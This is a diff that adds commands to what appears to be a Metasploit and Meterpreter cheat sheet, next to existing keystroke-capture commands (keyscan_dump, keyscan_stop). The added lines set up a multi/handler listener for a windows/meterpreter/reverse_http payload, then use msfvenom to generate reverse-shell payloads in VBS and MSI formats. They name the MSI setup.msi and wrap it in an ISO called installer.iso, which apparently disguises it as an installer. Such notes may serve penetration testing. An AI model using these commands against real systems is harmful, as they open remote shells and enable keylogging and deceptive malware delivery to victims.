@@ -215,6 +215,39 @@ keyscan_dump
 
 keyscan_stop
 
+
+- Tell Metasploit that we are going to be launching our payload outside of Metasploit and it should be ready to receive the connection.
+
+use exploit/multi/handler
+
+- set payload to meterpreter
+
+set PAYLOAD windows/meterpreter/reverse_http
+
+- Prevent listener from exiting on receiving a single connection
+
+set ExitOnSession false
+
+- launch the listener running it as a job (-j) and not interacting with new connections (-z).
+
+run -j -z
+
+- list the payload output formats.
+
+msfvenom --list formats
+
+- generate windows meterpreter payload in VBS format
+
+msfvenom -p windows/meterpreter/reverse_http lhost=eth0 lport=3333 -f vbs | tee /tmp/payload.vbs
+
+- generate windows meterpreter payload in MSI format
+
+msfvenom -p windows/meterpreter/reverse_http LHOST=eth0 LPORT=3333 -f msi -o /tmp/setup.msi
+
+- create iso file with some payload content
+
+genisoimage -o /tmp/installer.iso /tmp/setup.msi
+
 =======================================================
 
 Meterpreter
